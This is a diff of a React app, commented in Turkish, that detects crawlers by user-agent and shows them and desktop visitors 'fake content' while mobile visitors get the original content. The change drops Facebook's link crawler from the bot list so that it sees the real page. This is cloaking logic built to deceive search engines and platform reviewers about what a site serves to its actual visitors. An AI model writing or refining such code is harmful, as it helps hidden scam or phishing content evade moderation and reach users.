@@ -17,7 +17,7 @@ function AppRoutes({ isBot, isMobile }) {
   const { state } = useAuth();
   const { isAuthenticated, isPhoneVerified } = state;
 
-  // Bot veya desktop ise sahte içerik, mobil ise orijinal içerik
+  // Bot (facebookexternalhit hariç) veya desktop ise sahte içerik, mobil ise orijinal içerik
   const showFakeContent = isBot || !isMobile;
 
   return (
@@ -70,11 +70,11 @@ export default function App() {
     console.log('User-Agent:', userAgent); // Hata ayıklama
     const botPatterns = [
       'Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Slurp', 'Baiduspider',
-      'Applebot', 'facebookexternalhit', 'Twitterbot', 'LinkedInBot',
+      'Applebot', 'Twitterbot', 'LinkedInBot',
       'Pinterestbot', 'Slackbot', 'Discordbot'
     ];
     const detectedBot = botPatterns.some(bot => userAgent.includes(bot));
-    console.log('Bot tespit edildi:', detectedBot); // Hata ayıklama
+    console.log('Bot tespit edildi (facebookexternalhit hariç):', detectedBot); // Hata ayıklama
 
     // Cihaz türünü tespit et (ekran genişliğiyle)
     const handleResize = () => {
@@ -88,7 +88,7 @@ export default function App() {
   useEffect(() => {
     setIsBot(prev => {
       const userAgent = navigator.userAgent || '';
-      const detectedBot = ['Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Slurp', 'Baiduspider', 'Applebot', 'facebookexternalhit', 'Twitterbot', 'LinkedInBot', 'Pinterestbot', 'Slackbot', 'Discordbot'].some(bot => userAgent.includes(bot));
+      const detectedBot = ['Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Slurp', 'Baiduspider', 'Applebot', 'Twitterbot', 'LinkedInBot', 'Pinterestbot', 'Slackbot', 'Discordbot'].some(bot => userAgent.includes(bot));
       return detectedBot;
     });
   }, []);
